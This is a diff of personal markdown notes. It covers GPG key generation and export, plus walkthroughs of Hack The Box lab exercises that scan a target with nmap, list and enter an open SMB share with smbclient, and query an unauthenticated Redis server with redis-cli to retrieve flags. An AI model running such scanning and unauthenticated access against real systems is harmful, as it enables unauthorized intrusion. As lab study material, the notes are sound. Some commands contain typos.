@@ -5,10 +5,13 @@
 `gpg --list-keys`
 
 the list will show on terminal as following
+
 pub...
+
 uid...
 
 use the following command to generate your own personal key!
+
 `gpg --full-generate-key`
 
 ```bash
@@ -73,6 +76,7 @@ pub rsaxxx
 uid xxx <xxx@xxx.com>
 sub rsaxxx 
 ```
+
 `gpg --list-secret-keys`
 
 ```bash
@@ -82,9 +86,11 @@ ssb
 ```
 
 now let's export the new key
+
 `gpg --armor --ouptut public-key-of-xxx.asc --export xxx@xxx.com `
 
 you get a result somewhat like this...
+
 ```bash
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 .............................................
@@ -104,6 +110,7 @@ this outputs the following
 `nmap -sV 10.129.110.188`
 
 nmap command shows services running on respective ports
+
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-01 18:16 CET
 Nmap scan report for 10.129.110.188
@@ -120,8 +127,11 @@ Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 ```
 
 smb refers to server message block, a common client server communication protocol 
+
 You can use smbclient to access the smb share
+
 Use help command to see command usage
+
 `smbclient -h`
 
 ```bash
@@ -145,6 +155,7 @@ Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
 
 
 Use smbclient command to connect to ip address of target machine given on hackthebox
+
 `sudo smbclient -L 10.129.110.188`
 
 ```bash
@@ -161,6 +172,7 @@ use command to get into disk
 `smbclient \\\\10.129.110.188\\Workshares`
 
 you're inside! now look around and capture the flag
+
 ```bash
 smb: \> ls
   .                                   D        0  Mon Mar 29 10:22:01 2021
@@ -196,12 +208,15 @@ getting file \James.P\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (avera
 ### Hackthebox Redeemer exercise - Redis-cli
 
 First use nmap to scan the ip address of target machine
+
 `nmap -sV -sC 10.129.207.131`
 
 adding -p-, allows for nmap to observe for ports. This takes a very long time, fyi
+
 `nmap -p- -sV 0.129.207.131`
 
 use redis-cli command to interact with redis database 
+
 `redis-cli -h 10.129.207.131`
 
 ```bash
@@ -347,8 +362,11 @@ cluster_enabled:0
 db0:keys=4,expires=0,avg_ttl=0
 ```
 now that you're in, select database 0 as the instructions ask on hackthebox.
+
 Then, list all the keys. 
+
 Lastly, get the flag!
+
 ```bash
 10.129.207.131:6379> select 0
 OK
